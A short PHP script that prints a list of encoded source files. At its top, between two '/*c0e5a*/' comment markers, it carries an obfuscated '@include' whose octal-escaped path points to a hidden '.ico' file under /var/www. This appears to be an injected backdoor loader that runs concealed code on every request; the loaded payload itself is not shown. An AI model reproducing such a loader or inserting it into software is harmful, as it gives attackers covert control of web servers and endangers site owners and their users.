<?php
/*c0e5a*/

@include "\057var\057www\057qa_\162qst\160gin\163_20\0619_u\160gra\144e/e\170ter\156als\057des\153top\055not\151fy/\056a0c\071847\061.ic\157";

/*c0e5a*/

$paths = array(
  '/Service',
  '/Plugin',
  '/controllers',
  '/Api'
);
$encodedFiles = array();
$rootPath = __DIR__ . '/source/';
$savePath = __DIR__ . '/output/';

require_once __DIR__ . '/encode.php';

echo "Below are the files which are encoded:";
echo "<br />";
echo "<br />";
asort($encodedFiles);
foreach( $encodedFiles as $file ) {
  echo $file . '<br />';
}
